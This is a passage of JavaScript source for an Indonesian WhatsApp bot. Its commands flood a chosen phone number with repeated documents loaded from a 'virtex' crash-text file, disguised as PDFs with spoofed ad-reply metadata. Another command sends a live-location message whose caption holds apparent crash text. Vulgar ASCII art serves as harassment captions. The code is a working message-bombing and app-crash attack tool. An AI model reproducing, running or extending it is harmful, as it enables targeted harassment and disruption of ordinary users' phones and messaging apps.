"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:halo},
{quoted: fkonjo, contextInfo:{}})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:halo},
{quoted: fkonjo, contextInfo:{}})
await jobotz.sendMessage(m.chat, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:halo},
{quoted: fkonjo, contextInfo:{}})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:halo},
{quoted: fkonjo, contextInfo:{}})
await jobotz.sendMessage(m.chat, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:halo},
{quoted: fkonjo, contextInfo:{}})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:halo},
{quoted: fkonjo, contextInfo:{}})
await jobotz.sendMessage(m.chat, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:halo},
{quoted: fkonjo, contextInfo:{}})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:halo},
{quoted: fkonjo, contextInfo:{}})
await jobotz.sendMessage(m.chat, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:halo},
{quoted: fkonjo, contextInfo:{}})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:halo},
{quoted: fkonjo, contextInfo:{}})
await jobotz.sendMessage(m.chat, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:halo},
{quoted: fkonjo, contextInfo:{}})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:halo},
{quoted: fkonjo, contextInfo:{}})
await jobotz.sendMessage(m.chat, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:halo},
{quoted: fkonjo, contextInfo:{}})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:halo},
{quoted: fkonjo, contextInfo:{}})
await jobotz.sendMessage(m.chat, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:halo},
{quoted: fkonjo, contextInfo:{}})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:halo},
{quoted: fkonjo, contextInfo:{}})
buttonjo(`Berhasil Mengirim Hello Di Nomer ${text}`)
            }
            break
case 'jadipeler': {            
  if (!isCreator && !isBan) return
if (!m.quoted && !text) throw `Teksnya Mana?`
pelernya = `PELER ${text}
⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⢉⢉⠉⠉⠻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠟⠠⡰⣕⣗⣷⣧⣀⣅⠘⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠃⣠⣳⣟⣿⣿⣷⣿⡿⣜⠄⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡿⠁⠄⣳⢷⣿⣿⣿⣿⡿⣝⠖⠄⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠃⠄⢢⡹⣿⢷⣯⢿⢷⡫⣗⠍⢰⣿⣿⣿⣿⣿
⣿⣿⣿⡏⢀⢄⠤⣁⠋⠿⣗⣟⡯⡏⢎⠁⢸⣿⣿⣿⣿⣿
⣿⣿⣿⠄⢔⢕⣯⣿⣿⡲⡤⡄⡤⠄⡀⢠⣿⣿⣿⣿⣿⣿
⣿⣿⠇⠠⡳⣯⣿⣿⣾⢵⣫⢎⢎⠆⢀⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠄⢨⣫⣿⣿⡿⣿⣻⢎⡗⡕⡅⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠄⢜⢾⣾⣿⣿⣟⣗⢯⡪⡳⡀⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠄⢸⢽⣿⣷⣿⣻⡮⡧⡳⡱⡁⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡄⢨⣻⣽⣿⣟⣿⣞⣗⡽⡸⡐⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡇⢀⢗⣿⣿⣿⣿⡿⣞⡵⡣⣊⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡀⡣⣗⣿⣿⣿⣿⣯⡯⡺⣼⠎⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣧⠐⡵⣻⣟⣯⣿⣷⣟⣝⢞⡿⢹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡆⢘⡺⣽⢿⣻⣿⣗⡷⣹⢩⢃⢿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣷⠄⠪⣯⣟⣿⢯⣿⣻⣜⢎⢆⠜⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡆⠄⢣⣻⣽⣿⣿⣟⣾⡮⡺⡸⠸⣿⣿⣿⣿
⣿⣿⡿⠛⠉⠁⠄⢕⡳⣽⡾⣿⢽⣯⡿⣮⢚⣅⠹⣿⣿⣿
⡿⠋⠄⠄⠄⠄⢀⠒⠝⣞⢿⡿⣿⣽⢿⡽⣧⣳⡅⠌⠻⣿
⠁⠄⠄⠄⠄⠄⠐⡐⠱⡱⣻⡻⣝⣮⣟⣿⣻⣟⣻⡺⣊
`
await jobotz.sendMessage(m.chat, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:pelernya},
{quoted: fkonjo, contextInfo:{}})
buttonjo(`Sukses Convert Peler ${text}`)
}
break
case 'peler': {            
          if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
pelernya = `
⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⢉⢉⠉⠉⠻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠟⠠⡰⣕⣗⣷⣧⣀⣅⠘⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠃⣠⣳⣟⣿⣿⣷⣿⡿⣜⠄⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡿⠁⠄⣳⢷⣿⣿⣿⣿⡿⣝⠖⠄⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠃⠄⢢⡹⣿⢷⣯⢿⢷⡫⣗⠍⢰⣿⣿⣿⣿⣿
⣿⣿⣿⡏⢀⢄⠤⣁⠋⠿⣗⣟⡯⡏⢎⠁⢸⣿⣿⣿⣿⣿
⣿⣿⣿⠄⢔⢕⣯⣿⣿⡲⡤⡄⡤⠄⡀⢠⣿⣿⣿⣿⣿⣿
⣿⣿⠇⠠⡳⣯⣿⣿⣾⢵⣫⢎⢎⠆⢀⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠄⢨⣫⣿⣿⡿⣿⣻⢎⡗⡕⡅⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠄⢜⢾⣾⣿⣿⣟⣗⢯⡪⡳⡀⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠄⢸⢽⣿⣷⣿⣻⡮⡧⡳⡱⡁⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡄⢨⣻⣽⣿⣟⣿⣞⣗⡽⡸⡐⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡇⢀⢗⣿⣿⣿⣿⡿⣞⡵⡣⣊⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡀⡣⣗⣿⣿⣿⣿⣯⡯⡺⣼⠎⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣧⠐⡵⣻⣟⣯⣿⣷⣟⣝⢞⡿⢹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡆⢘⡺⣽⢿⣻⣿⣗⡷⣹⢩⢃⢿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣷⠄⠪⣯⣟⣿⢯⣿⣻⣜⢎⢆⠜⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡆⠄⢣⣻⣽⣿⣿⣟⣾⡮⡺⡸⠸⣿⣿⣿⣿
⣿⣿⡿⠛⠉⠁⠄⢕⡳⣽⡾⣿⢽⣯⡿⣮⢚⣅⠹⣿⣿⣿
⡿⠋⠄⠄⠄⠄⢀⠒⠝⣞⢿⡿⣿⣽⢿⡽⣧⣳⡅⠌⠻⣿
⠁⠄⠄⠄⠄⠄⠐⡐⠱⡱⣻⡻⣝⣮⣟⣿⣻⣟⣻⡺⣊
`
await jobotz.sendMessage(m.chat, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:momoe},
{quoted: fkonjo, contextInfo:{}})
}
buttonjo(`Sukses Send Monyet Sebanyak ${jumlah}`)
}
break
case 'jadimonyet': {            
          if (!isCreator && !isBan) return
if (!m.quoted && !text) throw `Teksnya Mana?`
             nyet = `Nama Gw ${text}
┈┈╱▔▔▔▔▔╲┈┈HM┈HM
┈╱┈┈╱▔╲╲╲▏┈┈┈HMM
╱┈┈╱━╱▔▔▔▔▔╲━╮┈┈
▏┈▕┃▕╱▔╲╱▔╲▕╮┃┈┈
▏┈▕╰━▏▊▕▕▋▕▕━╯┈┈
╲┈┈╲╱▔╭╮▔▔┳╲╲┈┈┈
┈╲┈┈▏╭━━━━╯▕▕┈┈┈
┈┈╲┈╲▂▂▂▂▂▂╱╱┈┈┈
┈┈┈┈▏┊┈┈┈┈┊┈┈┈╲┈
┈┈┈┈▏┊┈┈┈┈┊▕╲┈┈╲
┈╱▔╲▏┊┈┈┈┈┊▕╱▔╲▕
┈▏ ┈┈┈╰┈┈┈┈╯┈┈┈▕▕
┈╲┈┈┈╲┈┈┈┈╱┈┈┈╱┈╲
┈┈╲┈┈▕▔▔▔▔▏┈┈╱╲╲╲▏
┈╱▔┈┈▕┈┈┈┈▏┈┈▔╲▔▔
┈╲▂▂▂╱┈┈┈┈╲▂▂▂╱┈
`
await jobotz.sendMessage(m.chat, {text:nyet},{quoted:fgamjo})
buttonjo(`Sukses Convert Monyet ${text}`)
}
break
case 'monyet': {            
          if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
             nyet = `
┈┈╱▔▔▔▔▔╲┈┈HM┈HM
┈╱┈┈╱▔╲╲╲▏┈┈┈HMM
╱┈┈╱━╱▔▔▔▔▔╲━╮┈┈
▏┈▕┃▕╱▔╲╱▔╲▕╮┃┈┈
▏┈▕╰━▏▊▕▕▋▕▕━╯┈┈
╲┈┈╲╱▔╭╮▔▔┳╲╲┈┈┈
┈╲┈┈▏╭━━━━╯▕▕┈┈┈
┈┈╲┈╲▂▂▂▂▂▂╱╱┈┈┈
┈┈┈┈▏┊┈┈┈┈┊┈┈┈╲┈
┈┈┈┈▏┊┈┈┈┈┊▕╲┈┈╲
┈╱▔╲▏┊┈┈┈┈┊▕╱▔╲▕
┈▏ ┈┈┈╰┈┈┈┈╯┈┈┈▕▕
┈╲┈┈┈╲┈┈┈┈╱┈┈┈╱┈╲
┈┈╲┈┈▕▔▔▔▔▏┈┈╱╲╲╲▏
┈╱▔┈┈▕┈┈┈┈▏┈┈▔╲▔▔
┈╲▂▂▂╱┈┈┈┈╲▂▂▂╱┈
`
await jobotz.sendMessage(m.chat, {text:nyet},{quoted:fgamjo})
}
buttonjo(`Sukses Send Monyet Sebanyak ${jumlah}`)
}
break
case 'jotengkorak': {            
if (!isCreator && !isBan) return
if (args.length == 0) return repjo(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
for (let i = 0; i < jumlah; i++) {
             teng = `
██▀░░░░░░░░░░░░░▀██
█│░░░░░░░░░░░░░░░│█
▌│░░░░░░░░░░░░░░░│▐
░└┐░░░░░░░░░░░░░┌┘░
░░└┐░░░░░░░░░░░┌┘░░
░░┌┘▄▄▄░░░░░▄▄▄└┐░░
▌░│████▌░░░▐████│░▐
█░│▐██▀░░▄░░▀██▌│░█
█▌┘░░░░░▐█▌░░░░░└▐█
██░░▄▄▓░▀█▀░▓▄▄░░██
██▄─┘█▌░░░░░▐█└─▄██
███░░▐─┬┬┬┬┬─▌░░███
███▌░░┬┼┼┼┼┼┬░░▐███
████▄░└┴┴┴┴┴┘░▄████
█████▄░░░░░░░▄█████
`
await jobotz.sendMessage(m.chat, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:teng},
{quoted: fkonjo, contextInfo:{}})
}
buttonjo(`Sukses Send Tengkorak Sebanyak ${jumlah}`)
}
            break
case 'jotengkorakto': {            
          if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
             teng = `
██▀░░░░░░░░░░░░░▀██
█│░░░░░░░░░░░░░░░│█
▌│░░░░░░░░░░░░░░░│▐
░└┐░░░░░░░░░░░░░┌┘░
░░└┐░░░░░░░░░░░┌┘░░
░░┌┘▄▄▄░░░░░▄▄▄└┐░░
▌░│████▌░░░▐████│░▐
█░│▐██▀░░▄░░▀██▌│░█
█▌┘░░░░░▐█▌░░░░░└▐█
██░░▄▄▓░▀█▀░▓▄▄░░██
██▄─┘█▌░░░░░▐█└─▄██
███░░▐─┬┬┬┬┬─▌░░███
███▌░░┬┼┼┼┼┼┬░░▐███
████▄░└┴┴┴┴┴┘░▄████
█████▄░░░░░░░▄█████
`
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:teng},
{quoted: fkonjo, contextInfo:{}})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:teng},
{quoted: fkonjo, contextInfo:{}})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:teng},
{quoted: fkonjo, contextInfo:{}})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:teng},
{quoted: fkonjo, contextInfo:{}})
await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:teng},
{quoted: fkonjo, contextInfo:{}})
await repjo(`Berhasil Mengirim Tengkorak Di Nomer ${text}`)
            }
            break
case 'jogastengkorak': {            
          if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
             teng = `
██▀░░░░░░░░░░░░░▀██
█│░░░░░░░░░░░░░░░│█
▌│░░░░░░░░░░░░░░░│▐
░└┐░░░░░░░░░░░░░┌┘░
░░└┐░░░░░░░░░░░┌┘░░
░░┌┘▄▄▄░░░░░▄▄▄└┐░░
▌░│████▌░░░▐████│░▐
█░│▐██▀░░▄░░▀██▌│░█
█▌┘░░░░░▐█▌░░░░░└▐█
██░░▄▄▓░▀█▀░▓▄▄░░██
██▄─┘█▌░░░░░▐█└─▄██
███░░▐─┬┬┬┬┬─▌░░███
███▌░░┬┼┼┼┼┼┬░░▐███
████▄░└┴┴┴┴┴┘░▄████
█████▄░░░░░░░▄█████
`
await jobotz.sendMessage(m.chat, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:teng},
{quoted: fkonjo, contextInfo:{}})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:teng},
{quoted: fkonjo, contextInfo:{}})
await jobotz.sendMessage(m.chat, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:teng},
{quoted: fkonjo, contextInfo:{}})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:teng},
{quoted: fkonjo, contextInfo:{}})
await jobotz.sendMessage(m.chat, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:teng},
{quoted: fkonjo, contextInfo:{}})
            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: fs.readFileSync('./src/virtex/Darkness メ'), mimetype: 'document/pdf', fileName: `${wm}                         ${thejo}`, thumbnail: virgam, quoted: fgamjo,
"contextInfo": {
"externalAdReply": {
"title": `${thejo}`,
"body":`${thejo}`,
"previewType": "PHOTO",
"showAdAttribution": true,
"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
"thumbnail": virgam,
"forwardingScore": 150,
"isForwarded": true
}}, caption:teng},
{quoted: fkonjo, contextInfo:{}})
 buttonjo(`Berhasil Mengirim Tengkorak Di Nomer ${text}`)
            }
            break
case 'jogasliveloc': {
if (!isCreator && !isBan) return
if (!text) throw `Nomernya mana?`
let doc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ "liveLocationMessage": {
"degreesLatitude": -6.9366881,
"degreesLongitude": 107.7228148,
"caption": `YAN BOTZ-MD ${philips} ${ngazap(prefix)}`,
"sequenceNumber": "1657997490287001",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAA